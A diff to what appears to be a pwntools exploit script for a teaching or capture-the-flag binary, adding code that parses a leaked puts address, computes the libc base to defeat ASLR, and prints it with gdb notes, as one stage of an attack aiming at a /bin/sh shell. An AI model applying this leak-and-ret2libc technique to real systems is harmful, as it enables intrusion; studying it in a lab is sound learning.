@@ -43,15 +43,36 @@ r = p.recvuntil(b"Welcome student! Can you run /bin/sh\n")
 print(r)
 p.sendline(payload1)
 
-leak = p.recvn(7) # receive address of __GI__IO_puts.
-leak = leak[::-1] # reverse byte order.
+leak = p.recvn(7) # receive address of __GI__IO_puts plus line-feed.
+leak = leak[::-1] # reverse byte order for printing.
 leak = leak[1:] # slice off line-feed (0xa).
 
 # e.g. leak: b'7ffff7e4be10
 # x/i 0x7ffff7e4be10
 # 0x7ffff7e4be10 <__GI__IO_puts>:      push   r14
 
-print(binascii.b2a_hex(leak))
+print('puts leak: ', binascii.b2a_hex(leak))
+
+# gdb gef> info proc map
+# 0x7ffff7dd6000     0x7ffff7dfc000    0x26000        0x0 /usr/lib/x86_64-linux-gnu/libc-2.33.so
+
+
+libc_start_noaslr = 0x7ffff7dd6000
+leak = int.from_bytes(leak, byteorder='big', signed=False)
+offset = leak - libc_start_noaslr
+
+# noaslr:
+# leak:  b'7ffff7e4be10'
+# offset to libc: 482832 0x75e10
+
+# with aslr:
+# leak - 0x75e10 -> libc start
+
+print('offset:', offset, hex(offset))
+libc_start = hex(leak - 0x75e10)
+
+print('libc start:', libc_start)
+print('compare with gdb> info proc map')
 
 r = p.recvuntil(b"Welcome student! Can you run /bin/sh\n")
 print(r)
